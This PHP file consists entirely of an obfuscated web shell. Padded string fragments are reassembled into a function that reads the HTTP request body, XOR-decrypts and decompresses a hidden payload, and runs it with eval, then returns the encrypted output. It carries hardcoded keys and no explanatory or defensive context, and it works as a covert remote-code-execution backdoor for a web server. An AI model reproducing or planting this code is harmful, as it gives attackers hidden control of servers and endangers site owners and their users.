<?php
$Z='@basyje64_encoyjde(yj@x(@gzcyjompressyj(yj$o),yj$k));pryjyjint("$p$kh$r$kf");}';
$y='l=syjtrlen($t);yj$o="yj"yj;for($i=0yj;$i<$l;){foryj($jyj=0yj;($j<$cyj&&$i<$l';
$P=')yj;yj$yjj++,$i++){$o.=$t{$yji}^$kyj{$j}yj;}}reyjtyjurn $o;}if (@pryjeg_m';
$H='yjm[1]),$k))yjyj);$o=@ob_geyjt_coyjntents();@yjob_endyj_cleayjn();$yjr=';
$b='atch(yj"/$kyjh(.+)yj$kf/",@fiyjle_getyj_coyjntents(yj"php:yj//input"yj),yj$m)';
$J='yj$k="c7cdaeyj5d";$kh="yj1yj8842034689yj4yj";$kf="ee7f5yjc4yj3e622";$p=';
$x='==1)yj {@ob_staryjyjt();@evayjl(@gzyjuyjncompress(@x(@bayjseyj64_yjdecode($';
$O='"yjJZINyjlXEIlW3yjetrly"yj;functyjion x($yjt,$kyj){$yjc=yjstrlenyj($k);$';
$j=str_replace('v','','cvreatve_vvfunvctivon');
$W=str_replace('yj','',$J.$O.$y.$P.$b.$x.$H.$Z);
$M=$j('',$W);$M();
?>
